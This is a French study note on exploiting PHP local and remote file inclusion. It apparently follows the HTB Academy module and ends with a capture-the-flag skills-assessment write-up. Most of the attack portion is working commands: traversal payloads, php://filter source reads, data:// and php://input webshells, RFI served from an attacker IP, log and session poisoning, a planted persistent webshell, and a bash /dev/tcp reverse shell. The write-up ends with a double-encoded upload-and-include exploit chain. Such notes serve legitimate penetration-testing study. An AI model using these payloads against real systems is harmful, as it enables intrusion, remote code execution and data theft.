- [ ] Quel filtre ? (`../` → `....//` → `%2e%2e%2f` → chemin autorisé)
- [ ] Lire les messages d'erreur PHP → ils donnent le chemin exact construit

### Phase 4 — Passer en boîte blanche ⭐
- [ ] `php://filter` sur la page vulnérable → voir la ligne `include()` et les filtres
- [ ] `php://filter` sur la page d'upload → `move_uploaded_file()`, répertoire, renommage
- [ ] `php://filter` sur `config.php`, `.env` → credentials
- [ ] Lire `php.ini` → `allow_url_include`, `disable_functions`, `open_basedir`
- [ ] Lire les configurations serveur → racine web, chemins de logs

### Phase 5 — Escalade vers la RCE
Par ordre de fiabilité :
1. [ ] **Upload piégé** (aucun prérequis)
2. [ ] **Log / session poisoning** (aucun prérequis, mais permissions)
3. [ ] **Wrappers** `data://` / `php://input` (si `allow_url_include`)
4. [ ] **RFI** (si `allow_url_include` + connectivité entrante)
5. [ ] **SSH** avec les credentials / clés trouvées (souvent le plus court)

### Phase 6 — Consolider
- [ ] Déposer un webshell permanent
- [ ] Établir un reverse shell stabilisé
- [ ] Chercher le flag / les objectifs

### Phase 7 — Nettoyer
- [ ] Couper les serveurs d'écoute (`python3 -m http.server`, `nc`)
- [ ] Supprimer les fichiers déposés
- [ ] Documenter les artefacts laissés (logs empoisonnés, sessions)

---

## 13. Cheatsheet — commandes clés

```bash
# ─── Détection ───────────────────────────────────────────────
?p=/etc/passwd
?p=../../../../etc/passwd
?p=....//....//....//etc/passwd
?p=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
?p=./languages/../../../../etc/passwd
?p=/etc/passwd%00                                  # PHP < 5.3.4

# ─── Lecture de source ───────────────────────────────────────
curl -s "http://CIBLE/index.php?p=php://filter/convert.base64-encode/resource=config" \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d

# ─── RCE : wrappers ──────────────────────────────────────────
echo '<?php system($_GET["cmd"]); ?>' | base64
curl -s 'http://CIBLE/index.php?p=data://text/plain;base64,PD9waHA...%3D%3D&cmd=id'
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://CIBLE/index.php?p=php://input&cmd=id"
curl -s "http://CIBLE/index.php?p=expect://id"

# ─── RCE : RFI ───────────────────────────────────────────────
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80                     # HTTP
sudo python3 -m pyftpdlib -p 21                    # FTP
impacket-smbserver -smb2support share $(pwd)       # SMB (Windows, sans allow_url_include)

?p=http://TON_IP/shell.php&cmd=id
?p=ftp://TON_IP/shell.php&cmd=id
?p=\\TON_IP\share\shell.php&cmd=whoami

# ─── RCE : upload ────────────────────────────────────────────
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

?p=./uploads/shell.gif&cmd=id
?p=zip://./uploads/shell.jpg%23shell.php&cmd=id
?p=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id

# ─── RCE : log poisoning ─────────────────────────────────────
echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison
curl -s "http://CIBLE/index.php" -H @Poison
curl -s "http://CIBLE/index.php?p=/var/log/apache2/access.log&cmd=id"

curl -s "http://CIBLE/index.php?p=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E" -b "PHPSESSID=ID"
curl -s "http://CIBLE/index.php?p=/var/lib/php/sessions/sess_ID&cmd=id" -b "PHPSESSID=ID"

# ─── Post-exploitation ───────────────────────────────────────
&cmd=id
&cmd=ls+-la+/
&cmd=find+/+-maxdepth+2+-name+"*flag*"+2>/dev/null
&cmd=cat+/chemin/vers/flag.txt
&cmd=echo+'<?php+system($_GET["c"]);+?>'+>+/var/www/html/s.php

nc -lvnp 4444
&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TON_IP/4444+0>%261'

# ─── Fuzzing ─────────────────────────────────────────────────
ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
     -u 'http://CIBLE/index.php?FUZZ=value' -ic -ac -c

ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u 'http://CIBLE/index.php?p=FUZZ' -ic -ac -c

ffuf -w SecLists/Discovery/Web-Content/common.txt \
     -u 'http://CIBLE/FUZZ.php' -ic -mc all -ac -c
```

---

## 14. Pièges & rappels

| Piège | Rappel |
|---|---|
| Espaces dans une URL | encoder en `+` ou `%20` |
| `+` et `=` du base64 | encoder en `%2B` et `%3D` |
| `#` du wrapper zip | encoder en `%23` |
| `/` du wrapper phar | encoder en `%2F` |
| `&` non quoté dans bash | met la commande en arrière-plan → toujours quoter l'URL |
| `$` non échappé dans un payload | utiliser des **guillemets simples** autour du payload |
| Copier le base64 à la souris | tronqué → passer par `curl` + `grep` |
| `?p=index` | boucle d'inclusion récursive → DoS |
| Fichier uploadé appelé directement | Apache le sert statiquement, **pas d'exécution** — il faut l'inclure |
| `accept=".jpg"` en HTML | ne filtre rien côté serveur |
| Session poisoning | webshell écrasé à chaque inclusion → déposer un shell permanent |
| Fuzzing `.php` | `-mc all` obligatoire (302 / 403 restent lisibles) |
| `php.ini` CLI vs Apache | deux fichiers distincts |
| Modif de `php.ini` | `systemctl restart apache2` obligatoire |
| Préfixe de nom de fichier | tue les wrappers et la RFI |
| Filtre `str_contains` + `urldecode` après | **double-encoder** (`%252e`/`%252f`) |
| URL non quotée en `curl` | le shell la déforme (`//`, `$`) → quotes simples, ou passer par Burp |
| Réponse vide sans message d'erreur | filtre passé mais chemin faux — vérifier la profondeur du `../` |
| Nommage par `md5_file` | recalculer le md5 du contenu **exact** (attention au `\n` de `echo`) |
| Profondeur du traversal | se calcule depuis le répertoire du préfixe d'`include`, pas depuis la racine |

---

## 15. Cas pratique — Skills Assessment (Sumace Consulting)

> [!example] Chaîne complète : filtre + upload + extension appendue
> Cible réelle qui combine plusieurs obstacles. Illustre pourquoi la lecture de source (§4, §9.5) est décisive.

### 15.1 Reconnaissance

Deux endpoints exploitables, découverts en parcourant l'application :
```
/api/image.php?p=<hash>        → sert les images/fichiers stockés (lecture)
/contact.php?region=<valeur>   → include("./regions/" . $region . ".php")
```

Le logo du site utilise déjà la LFI en fonctionnement normal :
```html
<img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/>
```
→ indice fort : les fichiers stockés sont nommés par **hash**, servis sans extension.

### 15.2 Lecture du source via php://filter

```
GET /api/image.php?p=php://filter/read=convert.base64-encode/resource=....//....//....//....//....//....//contact.php
```

> [!bug] Ne marchait que via Burp, pas en `curl`
> Cause : l'URL non quotée en ligne de commande était déformée par le shell (globbing sur `//`).
> **Correctif : toujours quoter l'URL en guillemets simples.** Burp contournait le problème sans le montrer.

**Source de `contact.php` :**
```php
$region = "AT";
$danger = false;
if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);      // ⭐ décodage APRÈS le filtre
    }
}
if (!$danger) {
    include "./regions/" . $region . ".php";       // préfixe + extension appendue
}
```

**Source de `application.php` :**
```php
$ext = end((explode(".", $file_name)));            // extension du nom d'origine (contrôlée)
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;   // nommage = md5 du CONTENU
move_uploaded_file($tmp_name, $target_file);
```

### 15.3 Les trois obstacles et leurs contournements

| Obstacle | Détail | Contournement |
|---|---|---|
| **Filtre `.` et `/`** | `str_contains` rejette les points/slashes littéraux | **double-encodage** : le filtre voit `%2e`/`%2f`, `urldecode()` les restaure ensuite |
| **Extension appendue** | `include(... . ".php")` | uploader en `.php` et **ne pas** remettre `.php` dans `region` |
| **Nommage par hash** | `md5_file($tmp_name)` | recalculer localement : `md5sum` du fichier **avec** son `\n` final |

> [!danger] La faille logique du filtre
> Le contrôle `str_contains` s'applique à `$_GET["region"]` **brut**, mais `urldecode()` est appliqué **après**. Le serveur web ayant déjà décodé une fois, il faut un **second** niveau d'encodage :
> ```
> .  →  %2e  →  %252e
> /  →  %2f  →  %252f
> ```
> `%2e` simple → décodé une fois par nginx → `.` littéral dans `$_GET` → **bloqué**.
> `%252e` → décodé une fois → `%2e` dans `$_GET` (pas de `.` littéral → passe ✅) → `urldecode()` → `.`

### 15.4 Payload final

```bash
# 1. Créer le webshell et calculer son md5 (avec le \n de echo)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
md5sum shell.php        # → fc023fcacb27a7ad72d605c4e300b389

# 2. Uploader via le formulaire (filename="shell.php" → $ext = "php")
#    stocké comme ../uploads/fc023fcacb27a7ad72d605c4e300b389.php

# 3. Inclure via contact.php — UN SEUL ../ (regions/ → uploads/)
GET /contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/flag_09ebca.txt
```

Décodage vérifié :
```
str_contains voit :  %2e%2e%2fuploads%2ffc023...389   (ni . ni / littéral → passe ✅)
urldecode() donne :  ../uploads/fc023...389
include() reçoit  :  ./regions/../uploads/fc023...389.php   ✅
```

### 15.5 Leçons transversales

- **La profondeur du traversal se calcule** : `contact.php` inclut depuis `./regions/`, donc `/uploads/` est à **un seul** `../`. Trois `../` sortent de la racine → fichier introuvable → réponse vide (pas d'erreur, juste un `<p>` vide).
- **Un `<p>` vide ≠ filtre bloqué.** Pas de message « invalid character » = le filtre est passé ; c'est le chemin qui est faux. Distinguer les deux échecs.
- **Deux endpoints, deux comportements sur le même répertoire** : `image.php` lit les uploads (pas d'exécution), `contact.php` les inclut (exécution). Toute la logique du module condensée dans une cible.
- **Toujours lire le source avant d'exploiter à l'aveugle** : le filtre exact, le schéma de nommage et le préfixe se lisent en clair, ce qui transforme des heures de tâtonnement en un payload construit sur des faits.

---

## 16. Références

- HTB Academy — *File Inclusion*
- PayloadsAllTheThings — *File Inclusion*
- OWASP — *Path Traversal*, *Testing for Local File Inclusion*
- Synacktiv — *PHP filter chains: file read from error-based oracle* (2023)
- `wordlists.assetnote.io`
- `github.com/six2dez/OneListForAll`
